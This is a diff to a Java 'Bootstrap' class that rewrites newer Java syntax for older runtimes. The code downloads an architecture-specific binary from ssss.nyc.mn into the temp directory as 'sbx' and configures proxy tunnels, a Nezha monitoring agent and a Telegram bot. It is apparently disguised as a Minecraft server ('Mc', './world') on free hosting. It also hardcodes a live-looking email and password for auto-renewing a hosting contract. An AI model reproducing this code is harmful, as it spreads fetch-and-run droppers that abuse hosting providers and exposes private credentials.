@@ -21,12 +21,12 @@ public class Bootstrap {
     // ==============================================
     // 环境变量配置 - 使用Set提高查找效率
     // ==============================================
-    private static final Set<String> ALL_ENV_VARS = Set.of(
+    private static final Set<String> ALL_ENV_VARS = new HashSet<>(Arrays.asList(
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
-    );
+    ));
 
     // ==============================================
     // 续期配置 - 使用单例模式减少开销
@@ -40,15 +40,16 @@ public class Bootstrap {
     private static final String RENEW_URL = "https://greathost.es/api/renewal/contracts/8cbb0e9d-1bf4-4543-be05-814d129c17e5/renew-free";
     private static final String CREDENTIALS = "email=xidiaomao@outlook.com&password=3qZD4En3_P4:P!8";
     
-    // 默认环境变量 - 使用Map.of创建不可变Map
-    private static final Map<String, String> DEFAULT_ENV = Map.of(
-        "UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383",
-        "FILE_PATH", "./world",
-        "CFIP", "store.ubi.com",
-        "CFPORT", "443",
-        "NAME", "Mc",
-        "DISABLE_ARGO", "true"
-    );
+    // 默认环境变量
+    private static final Map<String, String> DEFAULT_ENV = new HashMap<>();
+    static {
+        DEFAULT_ENV.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        DEFAULT_ENV.put("FILE_PATH", "./world");
+        DEFAULT_ENV.put("CFIP", "store.ubi.com");
+        DEFAULT_ENV.put("CFPORT", "443");
+        DEFAULT_ENV.put("NAME", "Mc");
+        DEFAULT_ENV.put("DISABLE_ARGO", "false");
+    }
 
     public static void main(String[] args) throws Exception {
         // 快速版本检查
@@ -124,31 +125,35 @@ public class Bootstrap {
     // ==============================================
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         // 快速加载系统环境变量
-        ALL_ENV_VARS.forEach(var -> {
+        for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
-            if (value != null && !value.isBlank()) {
+            if (value != null && !value.trim().isEmpty()) {
                 envVars.put(var, value);
             }
-        });
+        }
         
         // 延迟加载.env文件
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
-            Files.lines(envFile)
-                .map(String::trim)
-                .filter(line -> !line.isEmpty() && !line.startsWith("#"))
-                .map(line -> line.split(" #")[0].split(" //")[0].trim())
-                .filter(line -> line.startsWith("export "))
-                .map(line -> line.substring(7).trim())
-                .map(line -> line.split("=", 2))
-                .filter(parts -> parts.length == 2)
-                .forEach(parts -> {
+            List<String> lines = Files.readAllLines(envFile);
+            for (String line : lines) {
+                line = line.trim();
+                if (line.isEmpty() || line.startsWith("#")) continue;
+                
+                line = line.split(" #")[0].split(" //")[0].trim();
+                if (line.startsWith("export ")) {
+                    line = line.substring(7).trim();
+                }
+                
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
                     String key = parts[0].trim();
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                     if (ALL_ENV_VARS.contains(key)) {
                         envVars.put(key, value);
                     }
-                });
+                }
+            }
         }
     }
     
@@ -157,12 +162,18 @@ public class Bootstrap {
     // ==============================================
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
-        String url = switch (true) {
-            case osArch.contains("amd64"), osArch.contains("x86_64") -> "https://amd64.ssss.nyc.mn/sbsh";
-            case osArch.contains("aarch64"), osArch.contains("arm64") -> "https://arm64.ssss.nyc.mn/sbsh";
-            case osArch.contains("s390x") -> "https://s390x.ssss.nyc.mn/sbsh";
-            default -> throw new RuntimeException("Unsupported architecture: " + osArch);
-        };
+        String url;
+        
+        // 使用传统的if-else语句替代switch表达式
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/sbsh";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
         
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
@@ -207,10 +218,13 @@ public class Bootstrap {
         }
         
         // 使用单线程池减少资源消耗
-        renewalScheduler = Executors.newSingleThreadScheduledExecutor(r -> {
-            Thread t = new Thread(r, "Renewer");
-            t.setDaemon(true); // 设置为守护线程
-            return t;
+        renewalScheduler = Executors.newSingleThreadScheduledExecutor(new ThreadFactory() {
+            @Override
+            public Thread newThread(Runnable r) {
+                Thread t = new Thread(r, "Renewer");
+                t.setDaemon(true); // 设置为守护线程
+                return t;
+            }
         });
         
         System.out.println("[Renewer] Started");
@@ -252,7 +266,7 @@ public class Bootstrap {
             };
             
             String response = executeCommand(command);
-            var matcher = TOKEN_PATTERN.matcher(response);
+            java.util.regex.Matcher matcher = TOKEN_PATTERN.matcher(response);
             
             if (matcher.find()) {
                 currentToken = matcher.group(1);
